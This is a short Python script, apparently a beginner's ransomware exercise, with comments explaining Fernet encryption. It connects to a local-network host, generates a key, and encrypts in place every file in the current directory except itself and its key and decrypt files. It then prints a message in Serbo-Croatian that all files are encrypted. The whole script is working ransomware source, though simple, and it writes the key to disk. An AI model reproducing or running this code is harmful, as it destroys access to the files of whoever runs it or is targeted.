#!/usr/bin/env python3
 
import os
import socket
#what is fernet? fernet is symmetric encryption method.
#which makes sure that the message encrypted cannot be mani
#pulated/read without the key. It uses URL safe encoding for
#the keys.Fernet also uses 128-bit AES

from cryptography.fernet import Fernet


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '192.168.0.29'
port = 12345

s.connect((host,port))
print(s.recv(1024))


#lets find some files

files = []

for file in os.listdir():
	if file == "ransomware.py"or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("Svi fajlovi su enkriptovani :)")


s.close()